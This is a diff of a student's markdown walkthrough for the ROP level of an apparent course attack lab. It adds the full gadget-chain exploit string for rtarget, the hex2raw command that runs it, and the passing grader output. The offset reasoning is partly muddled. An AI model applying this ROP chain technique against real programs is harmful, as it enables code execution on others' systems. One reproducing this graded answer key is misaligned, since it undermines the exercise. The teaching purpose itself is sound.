@@ -430,16 +430,17 @@ the `90` in between `58` and `c3` shouldn't be a problem because it is a `nop`.
 
 #### step4
 
-offset is the distance between the first line to cookie string line - 1 (address offset). so (10 - 1) * 8 = 72 = 0x48.
+why the offset? the offset is important because we need to have enough space for the empty row to the touch3 address. for now, let's fill in the row with just 0s
 
-you need this offset to fit in all your instructions and not cause a seg fault.
+`00 00 00 00 00 00 00 00`. we'll modify at the last step.
 
 
 #### step5
 
-when doing `movl`, the upper 4 bytes are ignored, and only the lower 32 bits are used.
 
-in these next few steps, there will be weird things like `08 db` and `08 d2` in between the instruction and the return value `c3`. the ones that are on the pdf chart that indicate 2-byte nop instrucitons are the ones you want  to use.
+in these next few steps, there will be weird things like `08 db` and `08 d2` in between the instruction and the return value `c3`. the ones that are on the pdf chart that indicate 2-byte nop instrucitons are the ones you want to use.
+
+when doing `movl`, the upper 4 bytes are ignored, and only the lower 32 bits are used.
 
 `movq %rax, %rsi`. since this instruction needs to be broken up, my gadget farm indicated I needed to go
 
@@ -482,12 +483,15 @@ in these next few steps, there will be weird things like `08 db` and `08 d2` in 
   402907:	8d 87 89 d6 08 d2    	lea    -0x2df72977(%rdi),%eax
   40290d:	c3                   	ret
 ```
-`08 d2 = NOP`
 
 `402907 + 2 = 402909`
 
 
+you will notice in each of these steps there are weird encodings like `20 db` or `08 d2` in between the `movl "" ""` instruction code and `c3`. these are the 2-byte nop encodings, and just like how `90` functions as a nop code, these will have no effect on your memory addresses.
+
 #### step8
+
+for this step, all we need to do is locate the address of the `add_xy` function. literally the only simple part to this whole phase, ha.
 
 `lea (%rdi, %rsi, 1), %rax (add_xy)`
 
@@ -528,6 +532,47 @@ cookie string (from phase3)
 
 `32 61 33 39 65 66 62 64`
 
+
+### remember that offset? yeah let's do that now
+
+so, for the offset, since we have now assembled all of the instructions together, we can count how many steps there are including the offset. I have 6 lines of 8 bytes which means that I'll need an offset of 48 written like `48 00 00 00 00 00 00 00`.
+
+
+#### the txt document
+
+phew, that was a lot of steps. if you've followed along so far, this is what your .txt file should look like
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* buffer */
+9f 28 40 00 00 00 00 00 /* step1: movq %rsp, %rax */
+b4 27 40 00 00 00 00 00 /* step2: movq %rax, %rdi */
+c0 27 40 00 00 00 00 00 /* step3: popq %rax */
+48 00 00 00 00 00 00 00 /* step4: offset */
+fe 28 40 00 00 00 00 00 /* step5: movl %eax, %ecx */
+5d 28 40 00 00 00 00 00 /* step6: movl %ecx, %edx */
+09 29 40 00 00 00 00 00 /* step7: movl %edx, %esi */
+d2 27 40 00 00 00 00 00 /* step8: lea (%rdi,%rsi,1), %eax (add_xy) */
+b4 27 40 00 00 00 00 00 /* step2: movq %rax, %rdi */
+c6 26 40 00 00 00 00 00 /* step10: touch3 address (from phase3) */
+32 61 33 39 65 66 62 64 /* step11: cookie string */
+```
+
+
 finally, this can all be run using
 
 `cat rtarget.l3.txt | ./hex2raw | ./rtarget`
+
+
+the final output should look something like
+
+```
+Cookie: 0x2a39efbd
+Type string:Touch3!: You called touch3("2a39efbd")
+Valid solution for level 3 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+```
